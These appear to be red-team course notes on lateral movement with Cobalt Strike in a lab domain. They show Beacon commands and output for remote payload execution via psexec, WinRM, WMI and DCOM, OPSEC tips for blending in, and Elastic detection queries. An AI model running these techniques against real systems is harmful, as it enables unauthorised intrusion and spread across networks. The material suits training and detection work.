---
description: 09/17/2025
---

# ✅ Lateral Movement

## Motivation/What is it?

Moving laterally between computers in a domain is important for accessing sensitive information, materials, and for obtaining new credentials.

## Beacon Commands

Cobalt Strike provides three strategies for executing Beacons/code/commands on remote targets.

### `jump`

_<mark style="color:green;">**The first and most convenient**</mark>_ is to use the built-in <mark style="color:yellow;">`jump`</mark> command. The syntax for it is: <mark style="color:yellow;">`jump [method] [target] [listener]`</mark>.

Type <mark style="color:yellow;">`jump`</mark> to see a list of methods.

**This will spawn a Beacon payload on the remote target and if using a P2P listener, it will connect to it automatically:**

```
beacon> jump

Beacon Remote Exploits
======================

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM
```

Each <mark style="color:yellow;">`method`</mark> comes with its own set of OPSEC concerns, but we'll review some of the main indicators below.

### `remote-exec`

_<mark style="color:green;">**The second strategy**</mark>_ is to use the built-in <mark style="color:yellow;">`remote-exec`</mark> command. The syntax is <mark style="color:yellow;">`remote-exec [method] [target] [command]`</mark>.&#x20;

**Use&#x20;**<mark style="color:yellow;">**`remote-exec`**</mark>**&#x20;to see a list of methods to review:**

```
beacon> remote-exec

Beacon Remote Execute Methods
=============================

    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI
```

The <mark style="color:yellow;">`remote-exec`</mark> commands simply provide a means of executing commands on a remote target.&#x20;

They are therefore not exclusive to lateral movement, but they can be used as such. As a result, _<mark style="color:yellow;">**they require more manual work to manage the payload**</mark>_, _<mark style="color:green;">**but do offer a wider degree of control over what gets executed on the target**</mark>_. You also need to connect to P2P Beacons manually using <mark style="color:yellow;">`connect`</mark> or <mark style="color:yellow;">`link`</mark>.

### Cobalt Strike Primitives

_<mark style="color:green;">**The third strategy**</mark>_ is to use Cobalt Strike's other primitives (<mark style="color:yellow;">`powershell`</mark>, <mark style="color:yellow;">`execute-assembly`</mark>, etc.) to implement something entirely custom.

<mark style="color:yellow;">This requires the most amount of effort for obvious reasons</mark> (since it can be completely tailored to your liking), <mark style="color:green;">but gives you the highest degree of control</mark>. Custom methods can be integrated into the <mark style="color:yellow;">`jump`</mark> and <mark style="color:yellow;">`remote-exec`</mark> commands using _**Aggressor**_.

Each of these strategies are compatible with the various techniques described in the _**User Impersonation**_ section. For example, you can use `pth` to impersonate a user and then `jump` to move laterally.

#### `Seatbelt` Integration

**Some of&#x20;**<mark style="color:yellow;">**`seatbelt`**</mark>**'s commands can also be run remotely, w**<mark style="color:green;">**hich can be incredibly useful when enumerating its configurations and defense implementations before jumping into it**</mark>**:**

```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web

  Hostname                      :  web
  Domain Name                   :  dev.cyberbotic.io
  ProductName                   :  Windows Server 2022 Datacenter
  EditionID                     :  ServerDatacenter
  ReleaseId                     :  2009
  Build                         :  20348
  BuildBranch                   :  fe_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD6
```

{% hint style="info" %}
Most lateral movement techniques will leverage legitimate Windows Management functionality, as this type of traffic and activity is not unusual to see on a network.
{% endhint %}

## Windows Remote Management

The <mark style="color:yellow;">`winrm`</mark> and <mark style="color:yellow;">`winrm64`</mark> methods can be used for 32/64-bit targets as needed.

The _<mark style="color:green;">**SMB Beacon is an excellent choice when moving laterally**</mark>_.

{% hint style="info" %}
:bulb:

This is because the SMB protocol is used extensively in a Windows environment, meaning this traffic will "blend in" very well with the rest of the network traffic.
{% endhint %}

&#x20;**See below:**

```
beacon> jump winrm64 web.dev.cyberbotic.io smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10) on web.dev.cyberbotic.io via WinRM
[+] host called home, sent: 225172 bytes
[+] established link to child beacon: 10.10.122.30
```

_**WinRM**_ will return a high-integrity Beacon running as the user with which you're interacting with the remote machine as.

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This new Beacon will be running inside the `wsmprovhost.exe` binary, which is the "Host process for WinRM plug-ins".

This is used whenever WinRM is used, legitimate or otherwise.

### Detecting WinRM

**You can search for process start events, but this will produce a lot of false positives if WinRM is being used legitimately throughout the network by system administrators:**

{% code overflow="wrap" %}
```
event.category: process and event.type: start and process.name: wsmprovhost.exe
```
{% endcode %}

**The most likely means of identifying this lateral movement is by searching PowerShell script block logs for known payload artifacts:**

{% code overflow="wrap" %}
```
event.category: process and powershell.file.script_block_text: "$var_runme.Invoke([IntPtr]::Zero)"
```
{% endcode %}

## Using `psexec`

The `psexec`/`psexec64` commands work by uploading a service binary to the target system, then creating and starting a Windows service to execute that binary.&#x20;

* Beacons executed this way will run at `SYSTEM`-level integrity

```
beacon> jump psexec64 web.dev.cyberbotic.io smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10) on web via Service Control Manager (\\web\ADMIN$\768870c.exe)

Started service 768870c on web.dev.cyberbotic.io
[+] established link to child beacon: 10.10.122.30
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Detecting `PsExec`

A reliable way of searching for `PsExec` is by looking for `4697` service created events.

These are often quite rare, unless a service comes with a software installation or something similar.

Cobalt Strike generates a random 7-characted alphanumeric string which is then used for both the service name and binary file name.

When seeing the `binPath` for the service, it will use a `UNC` path to the `ADMIN$` share:

```
event.code: 4697 and winlog.event_data.ServiceFileName: \\\\*\\ADMIN$\\*.exe
```

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### `psexec_psh`

`psexec_psh` does not copy a binary to the target.

Rather, it executes a PowerShell one-liner (always 32-bit).

The pattern it uses by default is: `%COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand (...)`.

```
beacon> jump psexec_psh web smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10) on web via Service Control Manager (PSH)

Started service bd119dd on web
[+] established link to child beacon: 10.10.122.30
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Windows Management Instrumentation (WMI)

As you may have noticed, WMI is not part of the <mark style="color:yellow;">`jump`</mark> command but it is apart of the <mark style="color:yellow;">`remote-exec`</mark>.

The <mark style="color:yellow;">`remote-exec`</mark> method uses WMI's _**"process call create"**_ <mark style="color:yellow;">to execute any command we specify on the target</mark>.

<mark style="color:green;">The most straightforward means of using this is to upload a payload to the target system and use WMI to execute it</mark>.

### File Upload via WMI

**We can&#x20;**<mark style="color:yellow;">**upload files to a remote machine by**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`cd`**</mark><mark style="color:yellow;">**'ing into the desired**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`UNC`**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**path and then use the**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`upload`**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**command**</mark>**:**

```
beacon> cd \\web.dev.cyberbotic.io\ADMIN$
beacon> upload C:\Payloads\smb_x64.exe
beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
Started process 3280 on web.dev.cyberbotic.io
```

**The process is now running on `WEB` so we need to now connect to it:**

```
beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
[+] established link to child beacon: 10.10.122.30
```

**Same as with WinRM, the process will be running in an elevated context of the calling user:**

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Detecting WMI

When a binary is executed via WMI in this way, it will be a child of `WmiPrvSE.exe`.&#x20;

We can then look for process create events where `WmiPrvSE` is the parent:

```
event.category: process and event.type: start and process.parent.name: WmiPrvSE.exe
```

<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

## The Curious Case of `CoInitializeSecurity`

{% hint style="info" %}
BOF stands for [Beacon Object File](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm).

They are a special type of object file designed to work specifically for the Cobalt Strike Framework.&#x20;

Essentially, it is a compiled C program that allows it to execute within a Beacon process and use internal beacon APIs.

It allows us to rapidly extend Beacon agent with new post-exploitation features.
{% endhint %}

Beacon's internal implementation of WMI uses a [<mark style="color:yellow;">`Beacon Object File`</mark>](https://cobaltstrike.com/help-beacon-object-files), executed using the [<mark style="color:yellow;">`beacon_inline`</mark>_<mark style="color:yellow;">`_`</mark>_<mark style="color:yellow;">`execute`</mark>](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_inline_execute) Aggressor function. When a BOF is executed the [<mark style="color:yellow;">`CoInitializeSecurity`</mark>](https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializesecurity) `COM` object can be called, which is used to set the security context for the current process.

According to Microsoft's documentation, this can only be called once per process.

The unfortunate consequence is that you will have `CoInitializeSecurity` get called in the context of (for example), _**User A**_, then future BOFs may not be able to inherit a different security context (_**User B**_) for the lifetime of the Beacon process.

### Example

**This can look like the following:**

```
beacon> make_token DEV\jking Qwerty123
[+] Impersonated DEV\bfarmer

beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
CoInitializeSecurity already called. Thread token (if there is one) may not get used
[-] Could not connect to web.dev.cyberbotic.io: 5
```

We know that `jking` is a local admin on `WEB` but because `CoInitializeSecurity` has already been called (probably in the context of `bfarmer`), WMI will fail with an `ACCESS DENIED` result.

### Workaround?

_<mark style="color:yellow;">**Your WMI execution must come from a different process.**</mark>_

This can be achieved with commands such as <mark style="color:yellow;">`spawn`</mark> and <mark style="color:yellow;">`spawnas`</mark>, or even <mark style="color:yellow;">`execute-assembly`</mark> with a tool such as <mark style="color:yellow;">`SharpWMI`</mark>.

```
beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=web.dev.cyberbotic.io command="C:\Windows\smb_x64.exe"

[*] Host                           : web.dev.cyberbotic.io
[*] Command                        : C:\Windows\smb_x64.exe
[*] Creation of process returned   : 0
[*] Process ID                     : 3436
```

## Distributed Component Object Model (DCOM)

### What is it?

A proprietary Microsoft technology used for communication between software components and networked computers.

### Beacon Usage w/ DCOM

Beacon has no built-in capabilities to interact over Distributed Component Object Model (DCOM), so we much use an external command such as [<mark style="color:yellow;">`Invoke-DCOM`</mark>](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1).

Later, we'll see how this can be integrated within the <mark style="color:yellow;">`jump`</mark> command.

```
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
Completed

beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
[+] established link to child beacon: 10.10.122.30
```

**DCOM is more complicated to detect, since each "Method" works in a different way. In the particular case of&#x20;**<mark style="color:yellow;">**`MMC20.Application`**</mark>**, the spawned process will be a child of&#x20;**<mark style="color:yellow;">**`mmc.exe`**</mark>**:**

```
event.category: process and event.type : start and process.parent.name: mmc.exe
```

<figure><img src="../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>

Processes started via DCOM may also be observed where the parent is <mark style="color:yellow;">`svchost.exe`</mark> with command line arguments of <mark style="color:yellow;">`-k DcomLaunch`</mark>.
